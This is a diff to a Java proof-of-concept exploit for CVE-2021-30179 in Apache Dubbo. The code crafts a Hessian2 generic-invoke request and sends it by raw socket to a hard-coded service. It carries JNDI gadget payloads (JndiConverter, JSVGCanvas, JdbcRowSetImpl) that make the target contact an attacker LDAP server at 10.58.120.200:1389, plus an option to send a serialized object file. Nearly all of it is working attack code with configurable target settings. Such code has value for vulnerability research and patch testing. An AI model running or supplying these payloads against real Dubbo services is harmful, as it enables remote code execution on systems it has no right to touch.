@@ -1,30 +1,34 @@
 package cve;
 
+import java.util.HashMap;
+
 import util.FileUtil;
 import org.apache.dubbo.common.beanutil.JavaBeanDescriptor;
 import org.apache.dubbo.common.io.Bytes;
 import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
 
-
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.OutputStream;
 import java.net.Socket;
-import java.util.HashMap;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Random;
 
 /**
- * 漏洞编号:
- *      CVE-2021-30179
- * 适用版本:
- *      Apache Dubbo 2.7.0 to 2.7.9
- *      Apache Dubbo 2.6.0 to 2.6.9
- *      Apache Dubbo all 2.5.x versions
+ * 测试版本: dubbo 2.7.9
+ * 修复版本: dubbo 2.7.10
  */
 public class CVE_2021_30179 {
+
+    static String genericType = "raw";//raw   bean   nativejava
+    static String dubbo_ip = "10.58.120.200";
+    static int dubbo_port = 20880;
+    static String ldapUri = "ldap://10.58.120.200:1389/fg4e1a";
+
     public static void main(String[] args) throws Exception{
 
-        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
 
         // header.
         byte[] header = new byte[16];
@@ -35,50 +39,78 @@ public class CVE_2021_30179 {
 
         // set request id.
         Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
-        ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
-        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
+        ByteArrayOutputStream bodyBaos = new ByteArrayOutputStream();
+        Hessian2ObjectOutput body = new Hessian2ObjectOutput(bodyBaos);
 
         // set body
-        out.writeUTF("2.7.6");//dubbo版本
-        //todo 此处填写Dubbo提供的服务名
-        out.writeUTF("com.pacemrc.dubbo.api.DemoService");//接口全限定名
-        out.writeUTF("");//接口版本
-        out.writeUTF("$invoke");
-        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
-        //todo 此处填写Dubbo提供的服务的方法
-        out.writeUTF("sayHello");//接口的方法
-        out.writeObject(new String[] {"java.lang.String"});//接口方法的参数类型
+        body.writeUTF("2.7.9");
+        body.writeUTF("com.pacemrc.dubbo.api.DemoService");
+        body.writeUTF("");
+        body.writeUTF("$invoke");
+        body.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
+        body.writeUTF("sayHello");//接口的方法
+        body.writeObject(new String[] {"java.lang.String"});//接口方法的参数类型
 
-        // POC 1: raw.return
-        getRawReturnPayload(out, "ldap://10.58.120.200:1389/nco5cx");
+        switch (genericType) {
+            case "raw":
+                getRawReturnPayload2(body, ldapUri);
+                break;
+            case "bean":
+                getBeanPayload(body, ldapUri);
+                break;
+            case "nativejava":
+                getNativeJavaPayload(body, System.getProperty("user.dir")+ "/");
+        }
 
-        // POC 2: bean
-//        getBeanPayload(out, "ldap://10.58.120.200:1389/nco5cx");
+        body.flushBuffer();
 
-        // POC 3: nativejava
-//        getNativeJavaPayload(out, System.getProperty("user.dir")+ "\\CVE-2021-30179\\src\\main\\resources\\calc.ser");
+        Bytes.int2bytes(bodyBaos.size(), header, 12);
+        baos.write(header);
+        baos.write(bodyBaos.toByteArray());
 
-        out.flushBuffer();
-
-        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
-        byteArrayOutputStream.write(header);
-        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
-
-        byte[] bytes = byteArrayOutputStream.toByteArray();
+        byte[] bytes = baos.toByteArray();
 
         //todo 此处填写Dubbo服务地址及端口
-        Socket socket = new Socket("10.58.120.200", 20880);
+        Socket socket = new Socket(dubbo_ip, dubbo_port);
         OutputStream outputStream = socket.getOutputStream();
         outputStream.write(bytes);
         outputStream.flush();
         outputStream.close();
     }
 
-    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
+    private static void getRawReturnPayload1(Hessian2ObjectOutput out, String ldapUri) throws IOException {
+        HashMap jndi = new HashMap();
+        jndi.put("class", "org.apache.batik.swing.JSVGCanvas");
+        jndi.put("URI", ldapUri);
+        out.writeObject(new Object[]{jndi});
+
+        HashMap map = new HashMap();
+        map.put("generic", "raw.return");
+        out.writeObject(map);
+    }
+
+    private static void getRawReturnPayload2(Hessian2ObjectOutput out, String ldapUri) throws IOException {
         HashMap jndi = new HashMap();
         jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
         jndi.put("asText", ldapUri);
         out.writeObject(new Object[]{jndi});
+
+        HashMap map = new HashMap();
+        map.put("generic", "raw.return");
+        out.writeObject(map);
+
+    }
+
+    private static void getRawReturnPayload3(Hessian2ObjectOutput out, String ldapUri) throws IOException {
+        HashMap jndi = new HashMap();
+
+        jndi.put("class", "com.sun.rowset.JdbcRowSetImpl");
+        jndi.put("dataSourceName", "ldap://10.58.120.200:1389/nco5cx");
+        jndi.put("autoCommit", "true");
+
+        List<HashMap> list = new ArrayList<>();
+        list.add(jndi);
+        out.writeObject(new Object[]{list});
 
         HashMap map = new HashMap();
         map.put("generic", "raw.return");
@@ -97,7 +129,6 @@ public class CVE_2021_30179 {
 
     private static void getNativeJavaPayload(Hessian2ObjectOutput out, String serPath) throws IOException {
         byte[] payload = FileUtil.getBytesByFile(serPath);
-        System.out.println(payload.toString());
         out.writeObject(new Object[] {payload});
 
         HashMap map = new HashMap();
